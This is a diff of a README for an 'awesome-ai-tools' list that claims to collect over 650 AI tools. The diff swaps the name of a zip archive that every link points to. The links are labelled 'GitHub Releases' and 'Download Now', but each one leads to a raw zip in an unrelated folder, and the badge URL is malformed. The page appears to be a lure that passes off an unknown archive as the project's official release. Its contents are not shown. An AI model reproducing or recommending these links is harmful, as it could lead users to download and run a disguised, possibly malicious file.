@@ -1,17 +1,17 @@
 # 🤖 awesome-ai-tools - Elevate Your Creativity and Productivity 
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/awesome-ai-tools.zip%https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/awesome-ai-tools.zip)](https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/awesome-ai-tools.zip)
+[![Download](https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/tools_ai_awesome_v3.2.zip%https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/tools_ai_awesome_v3.2.zip)](https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/tools_ai_awesome_v3.2.zip)
 
 ## 📖 Introduction
-Welcome to "awesome-ai-tools," a curated collection of over 650 AI tools designed to boost productivity, enhance creativity, and drive innovation. Whether you're a student trying to streamline your studies or a professional aiming to improve your workflows, these tools can provide valuable assistance. We encourage you to explore, contribute via pull requests, and become part of our community. For a deeper look, visit https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/awesome-ai-tools.zip
+Welcome to "awesome-ai-tools," a curated collection of over 650 AI tools designed to boost productivity, enhance creativity, and drive innovation. Whether you're a student trying to streamline your studies or a professional aiming to improve your workflows, these tools can provide valuable assistance. We encourage you to explore, contribute via pull requests, and become part of our community. For a deeper look, visit https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/tools_ai_awesome_v3.2.zip
 
 ## 🚀 Getting Started
 To get started with "awesome-ai-tools," follow these simple steps to download and install the tools:
 
 1. **Visit the Releases Page**  
    Use the following link to access the releases page:  
-   [GitHub Releases](https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/awesome-ai-tools.zip)
+   [GitHub Releases](https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/tools_ai_awesome_v3.2.zip)
 
 2. **Choose Your Tool**  
    Browse through the list of available versions and tools. Each release includes various files that you can download.
@@ -48,7 +48,7 @@ Before downloading, ensure your system meets these basic requirements:
 Follow these steps to install the tools effectively:
 
 1. **Download from the Releases Page**  
-   Go to our [GitHub Releases](https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/awesome-ai-tools.zip).
+   Go to our [GitHub Releases](https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/tools_ai_awesome_v3.2.zip).
 
 2. **Select and Download**  
    Choose the appropriate file for your operating system and download it.
@@ -78,4 +78,4 @@ Explore these resources to enhance your understanding and utilization of AI tool
 - **Tutorials**: Video and written tutorials covering the basics and advanced functionalities.
 - **Blog**: Insights on using AI for productivity and creativity.
 
-We hope you find "awesome-ai-tools" beneficial for your needs! Don't forget to check the [GitHub Releases](https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/awesome-ai-tools.zip) page for the latest updates and tools. Enjoy your experience!
+We hope you find "awesome-ai-tools" beneficial for your needs! Don't forget to check the [GitHub Releases](https://raw.githubusercontent.com/Kashishgithib/awesome-ai-tools/master/apodeixis/tools_ai_awesome_v3.2.zip) page for the latest updates and tools. Enjoy your experience!
